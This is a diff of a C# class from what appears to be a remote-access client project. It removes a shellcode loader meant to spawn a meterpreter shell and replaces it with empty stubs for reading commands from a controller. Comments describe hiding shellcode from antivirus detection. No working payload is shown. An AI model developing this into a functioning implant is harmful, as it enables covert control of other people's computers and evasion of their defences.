@@ -5,29 +5,42 @@ using System.Linq;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace Client.Armitage
 {
+    /*
+     * I'm pretty sure this class is going to get detected by AV.
+     */
+
     /// <summary>
-    /// A class that spawns a meterpreter shell on a separate process.
+    /// A class that listens commands from the controller.
     /// </summary>
     public static class Shell
     {
-        /// It's necessary to put the ShellCode in string to prevent AV detection.
-        /// To generate one, see: https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c
-        /// Currently disabled because AntiVirus detects
-        public async static void Start(int procid = 0)
-        {
-            await Task.Run(() => {
-                // try and catch bc this is not stable
-                try {
-                    var bytes = Utilities.Converter.StringToByteArray(Properties.Resources.ShellCode);
+        private static Thread _reader;
+        /// <summary>
+        /// Starts listening for commands from the controller.
+        /// </summary>
+        public static void Start() { 
+        
+        }
+        public static void ContinuousReading() {
+            while (true) {
+                try
+                {
+
                 }
-                catch { 
+                catch (SocketException ex) { 
                 
                 }
-            });
+                catch
+                {
+                    // prevent from getting CPU to 100 when something bad happens
+                    Thread.Sleep(100);
+                }
+            }
         }
     }
 }
